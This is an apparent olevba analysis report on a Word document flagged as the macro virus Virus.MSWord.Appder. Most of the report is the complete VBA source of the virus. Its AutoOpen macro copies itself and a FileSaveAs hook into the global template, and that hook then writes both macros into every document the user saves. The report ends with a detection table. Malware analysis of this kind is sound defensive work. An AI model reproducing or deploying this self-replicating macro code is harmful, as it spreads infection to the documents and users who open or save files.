olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Appder-63e259cb8528155dd9a36c1514c8d3db87123b11
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Appder-63e259cb8528155dd9a36c1514c8d3db87123b11 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Appder-63e259cb8528155dd9a36c1514c8d3db87123b11 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Number_of_Macros
Dim count_
Dim AllreadyInstalled
Dim UnContagable
Dim name_of_file$
Dim CopiedMacro$
    
On Error GoTo -1: On Error GoTo Abort

    Number_of_Macros = WordBasic.CountMacros(0, 0)
    
    For count_ = 1 To Number_of_Macros
        
        If WordBasic.[MacroName$](count_, 0, 0) = "AutoOpen" Then
            AllreadyInstalled = -1
        End If
    
        If WordBasic.[MacroName$](count_, 0, 0) = "FileSaveAs" Then
            UnContagable = -1
        End If
    Next count_
    
If Not AllreadyInstalled And Not UnContagable Then
            
        name_of_file$ = WordBasic.[FileName$]()
        
        
        CopiedMacro$ = name_of_file$ + ":FileSaveAs"
        WordBasic.MacroCopy CopiedMacro$, "Global:FileSaveAs"
        
        CopiedMacro$ = name_of_file$ + ":AutoOpen"
        WordBasic.MacroCopy CopiedMacro$, "Global:AutoOpen"
        
    End If

Abort:


End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Appder-63e259cb8528155dd9a36c1514c8d3db87123b11 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$

    Dim NewFSA As Object: Set NewFSA = WordBasic.DialogRecord.FileSaveAs(False)

On Error GoTo -1: On Error GoTo Escape

    WordBasic.CurValues.FileSaveAs NewFSA

    WordBasic.Dialog.FileSaveAs NewFSA

    If NewFSA.Format = 0 Then NewFSA.Format = 1

    FName$ = WordBasic.[FileName$]()

    MacName$ = FName$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", MacName$

    MacName$ = FName$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", MacName$

    WordBasic.FileSaveAs NewFSA

    GoTo Done

Escape:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs NewFSA
End If

Done:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

